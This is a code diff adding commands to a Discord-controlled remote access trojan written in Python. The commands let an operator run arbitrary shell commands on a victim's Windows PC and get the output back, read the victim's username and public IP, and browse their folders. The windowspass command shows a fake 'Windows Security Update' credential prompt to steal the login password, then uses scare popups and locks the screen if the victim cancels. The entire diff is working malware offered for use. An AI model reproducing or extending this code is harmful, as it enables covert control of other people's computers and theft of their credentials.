@@ -22,3 +22,97 @@ All commands:
 (Maximum weight 8mb on v1 servers, if your server is v2 you can 50mb or v3 with 100mb)
 `{prefix}dfile <URL ARCHIVE> <PATH WHERE IT WILL BE SAVED>` : Download a file to the user PC
 `{prefix}cd <Route>` : Navigate through the user PC folders
+`{prefix}windowspass` : Generates a realistic window for the user to enter their session credentials (This to obtain the password and ADMINISTRATOR user)
+`{prefix}whoami` : Get information about the PC the file is running on.
+"""
+
+@bot.event
+async def on_ready():
+    print(f'{bot.user} ON!')
+# Comandos:
+
+@bot.command()
+async def ayuda(message):
+
+    embed=discord.Embed(
+            title="commands and help", 
+            description=cmds,
+            color=0xFF5733,
+            ).set_footer(text='')
+    await message.reply(embed=embed)
+
+@bot.command()
+async def whoami(message):
+    ip = requests.get('https://api.ipify.org').text
+    def whoami():
+        output = subprocess.run('whoami', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        return output 
+    whoami2 = str(whoami().stdout.decode('CP437'))
+    await message.reply(f'**The file was executed on the computer:** {whoami2} (PUBLIC IP: {ip})')
+    
+@bot.command()
+async def cmd(message, *, args=None):
+        if args == None: 
+            return await message.reply(f'**You must place a command to run in the user console.**\n Example: `{prefix}cmd <JUSTIFICATION [Command]>`')
+        command =  args
+        def shell():
+            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            return output 
+            
+        result = str(shell().stdout.decode('CP437'))
+        numb = len(result)
+        if numb < 1: return await message.reply('**Command executed successfully but... No command found or nothing output from the console.**')
+        if len(result) > 2000:
+            file = open('2000.txt', 'a')
+            file.write(result)
+            file.close()
+            os.system('attrib +h "2000.txt"')
+            filebuffer = discord.File("2000.txt", filename="2000.txt")
+            await message.reply(f'**Insert command successfully!**\n **Output:**', file=filebuffer)
+            os.remove('2000.txt')
+        else:
+            await message.reply(f'**Insert command successfully!**\n ```\nComando Output: {result}```')
+
+@bot.command()
+async def cd(message, *, args=None):
+    if args == None: return message.reply(f'**Place the route you want to move to.**\n ```\n ')
+    try:
+        os.chdir(args)
+        output = subprocess.run('dir', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result = str(output.stdout.decode('CP437'))
+        if len(result) > 2000:
+            file = open('2000.txt','a')
+            file.write(result)
+            file.close()
+            filebuffer = discord.File('2000.txt',filename='2000.txt')
+            await message.reply('**Command started successfully:**\n**Output:**\n', file=filebuffer)
+        else:
+            await message.reply(f'**Command started successfully:**\n ```\n Console Output:\n {result}```')
+    except os.error as err:
+        await message.reply(f'**An error occurred while trying to access the route:**\n```\nConsole Log:\n{err}```')
+
+
+@bot.command()
+async def windowspass(message, *,args=None):
+
+    import subprocess
+    
+
+    
+    log = "$cred=$host.ui.promptforcredential('Windows Security Update','Windows has received a security update. Please enter your username and password to continue using your device.',[Environment]::UserName,[Environment]::UserDomainName);"
+    username = 'echo **Username:** $cred.getnetworkcredential().username;'
+    password = 'echo **Password:** $cred.getnetworkcredential().password;'
+    command = 'Powershell "{} {} {}"'.format(log,username,password)
+
+
+    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+    result = str(output.stdout.decode('CP437'))
+    if not result:
+        os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""You must enter the credentials.""",0,"""Windows Security Update: ERROR""",0x30)')
+        output2 = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result2 = str(output2.stdout.decode('CP437'))
+        if not result2:
+            os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""You have canceled this security measure, so you should be aware that you could be exposed to critical system vulnerabilities.""",0,"""This action has been canceled.""",0x10)')
+
+            os.system('rundll32.exe user32.dll, LockWorkStation')
